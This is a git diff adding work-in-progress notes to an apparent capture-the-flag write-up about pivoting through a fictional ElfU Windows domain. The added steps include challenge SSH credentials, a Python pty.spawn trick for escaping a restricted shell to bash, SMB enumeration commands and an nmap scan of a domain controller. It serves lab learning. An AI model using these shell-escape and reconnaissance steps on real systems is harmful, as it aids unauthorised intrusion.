@@ -5,8 +5,23 @@ This challenge opens up after finishing challenge 7 - Printer Exploitation. \
 From the challenge name and description, we know this will be a Windows domain and that we'll have to pivot/auth to the various hosts in the domain in order to find the secret sleigh research doc.
 
 Eve Snowshoe will give you a hint after you finish the HoHoNo Fail2Ban challenge in Santa's office. Here's his hint:
-TODO
+
 
 ## Steps
 1. Go to https://register.elfu.org/
-2. 
+2. Register with rocks4socks@elfu.org (found in registration page source code)
+It returns access creds:
+New Student Domain Account Creation Successful!
+You can now access the student network grading system by SSH'ing into this asset using the command below:
+ssh iuiqfqxwoj@grades.elfu.org -p 2222
+ElfU Domain Username: iuiqfqxwoj
+ElfU Domain Password: Cdcmiwbly#
+
+After SSHing in, run ctl d to escape into python, then get a tty interactive shell:
+
+import pty;pty.spawn('/bin/bash')
+
+`nmblookup -A 172.17.0.4`
+`smbclient -L \\iuiqfqxwoj -I 172.17.0.4 -N`
+
+`nmap 10.128.3.30 -sV -sC > dc.txt`
